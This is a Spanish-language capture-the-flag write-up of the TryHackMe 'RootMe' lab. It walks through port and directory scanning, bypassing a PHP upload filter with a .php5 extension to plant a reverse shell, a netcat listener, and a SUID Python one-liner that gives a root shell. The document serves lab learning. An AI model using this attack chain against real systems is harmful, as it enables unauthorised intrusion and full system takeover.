## **Tutorial: Explotación de la máquina RootMe en TryHackMe**


## 1. Conexión a la VPN de TryHackMe

Para poder acceder a las máquinas del laboratorio es necesario conectarse primero a la VPN de TryHackMe. Esto crea un túnel cifrado entre la máquina Kali y la red privada del laboratorio.

### 1.1 Conexión mediante OpenVPN

Desde la terminal de Kali ejecutamos el siguiente comando utilizando el archivo .ovpn descargado desde la plataforma:

```bash
sudo openvpn /home/nerea/Descargas/eu-central-1-nereacandonramos-regular.ovpn
```
Si este no funciona, probar el west-3-
Si la conexión se establece correctamente aparecerá el mensaje:

```bash
Initialization Sequence Completed
```

Esto indica que la VPN se ha establecido correctamente.

### 1.2 Verificación de la conexión

Para comprobar que la conexión está activa ejecutamos:

```bash
ip a
```

Esto mostrará una interfaz de red llamada tun0, que corresponde a la conexión VPN con TryHackMe.

## 2. Escaneo de puertos con Nmap

El siguiente paso consiste en identificar los servicios expuestos en la máquina objetivo utilizando Nmap, una herramienta fundamental para el reconocimiento en auditorías de seguridad.

Se ejecuta el siguiente comando:

Escaneo completo de puertos:

```bash
nmap -sS -sV -A 10.128.142.83
```
![nmap](Maquina_de_Linux/RootMe/imagenes/nmap.png)

Observo que los puertos 22 (SSH) y 80 (HTTP) están abiertos.

---

## 2. Enumeración web

Accedo a http://10.128.142.83 en el navegador para ver la web principal.


![css](Maquina_de_Linux/RootMe/imagenes/url.png)

Busco directorios ocultos con:

```bash
gobuster dir -u http://10.128.142.83/ -w /usr/share/wordlists/dirb/common.txt -t 5
```

![css](Maquina_de_Linux/RootMe/imagenes/gobuster.png)

Encuentro un directorio interesantes

- /css
- /js
- /panel

Vamos a navegar dentro de cada ruta para ver si realmente son lo que dice.

Primero miramos el css y vemos que  que son simples archivos de css

![css](Maquina_de_Linux/RootMe/imagenes/css.png)

El segundo que vamos a mirar es el js para ver si es lo que  dice ser y observamos que si.

![js](Maquina_de_Linux/RootMe/imagenes/js.png)

Por último miramos la ruta panel  que es interesante.

![panel](Maquina_de_Linux/RootMe/imagenes/panel.png)
---


## 3. Acceso al panel y prueba de credenciales

Voy a http://192.168.142.53/panel/ y pruebo credenciales comunes como admin:admin, root:root, etc. Si no funcionan, intento inyecciones simples en los campos del formulario.

---

## 4. Prueba de subida de archivos

Si el panel permite subir archivos, intento subir una webshell en PHP:
Vamos a ir al a este git y descargamos el archivo php y ponemos la ip de nuestra máquina atacante.


```bash
https://github.com/pentestmonkey/php-reverse-shell?source=post_page-----ff4a8bce0e4c---------------------------------------
```

Después de editarlo, lo pasamos a la página del panel y lo subimos, nos dara error porque no deja subir archivos php.

![php](Maquina_de_Linux/RootMe/imagenes/php.png)

Como no nos deja probamos con otra extension, usaremos la de php5 y la subimos y así si nos deja.

![php](Maquina_de_Linux/RootMe/imagenes/php5.png)

Luego vamos a la ruta http://10.128.142.83/uploads/ para ver si se subió y vemos nuestro archivo subido.

![uploads](Maquina_de_Linux/RootMe/imagenes/shell.png)

---

## 5. Obtener una reverse shell

En mi máquina, escucho con netcat:

```bash
nc -lvnp 1234
```
Luego vamos a la ruta http://10.128.142.83/uploads/ y le damos al archivo que subimos para que se conecte 

![nc](Maquina_de_Linux/RootMe/imagenes/nc.png)

Ahora tengo acceso como www-data o usuario web.

---

## 6. Enumeración local y escalada de privilegios

Busco posibles vectores de escalada:

- Archivos SUID:

```bash
find / -perm -4000 2>/dev/null
```

Mirando la lista de archivos, nos encontramos con uno que me llama la atención.

```bash
/usr/bin/python2.7
```

![find2](Maquina_de_Linux/RootMe/imagenes/find2.png)


Buscamos técnicas de explotación en https://gtfobins.org/. En el buscador ponemos python y nos sale una para SUID, vamos a usar ese comando.

![python](Maquina_de_Linux/RootMe/imagenes/python.png)

```bash
/usr/bin/python -c 'import os; os.execl("/bin/sh","sh","-p")'
```

Este comando usa Python (con SUID) para ejecutarse con privilegios de root.
Luego, con os.execl, reemplaza el proceso por una shell (/bin/sh).
El parámetro -p hace que la shell mantenga los privilegios de root.

Ahora escribimos whoami para ver si somos root

![whoami](Maquina_de_Linux/RootMe/imagenes/root.png)

Observamos que somos root y tenemos acceso a todas las máquinas.

---

## 7. Confirmo acceso root

Compruebo que soy root con:

```
whoami
id
```

